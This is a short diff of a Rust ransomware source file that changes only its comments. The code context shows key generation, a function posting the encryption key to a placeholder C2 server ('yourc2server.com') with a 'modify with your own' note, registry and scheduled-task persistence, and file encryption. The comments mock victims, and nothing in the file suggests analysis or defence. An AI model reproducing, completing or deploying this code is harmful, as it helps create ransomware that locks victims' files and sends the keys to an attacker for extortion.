@@ -24,7 +24,6 @@ use std::ptr;
 use std::process::Command;
 use std::mem;
 
-// Constants for encryption
 const BUFFER_SIZE: usize = 1024;
 
 // XOR encryption for string obfuscation
@@ -39,7 +38,7 @@ fn generate_key() -> (Vec<u8>, Vec<u8>) {
     (key, iv)
 }
 
-// Send key to C2 server
+// c2 server, modify with your own
 fn send_key_to_c2(key: &[u8], iv: &[u8]) {
     let client = Client::new();
     let url = "https://yourc2server.com/receive_key";
@@ -64,7 +63,7 @@ fn save_key(key: &[u8], iv: &[u8]) {
     key_file.write_all(iv).expect("Unable to write IV");
 }
 
-// Add registry entry for persistence
+// Add  persistence
 fn add_to_registry() {
     unsafe {
         let hkey = winapi::um::winreg::HKEY_LOCAL_MACHINE;
@@ -92,7 +91,7 @@ fn create_task() {
         .expect("Failed to create scheduled task");
 }
 
-// Encrypt file using AES encryption
+// Encryption slumber party massacre happens here
 fn encrypt_file(file: &Path, key: &[u8], iv: &[u8]) {
     let mut input_file = File::open(file).expect("Unable to open file");
     let mut output_file = File::create("temp.enc").expect("Unable to create file");
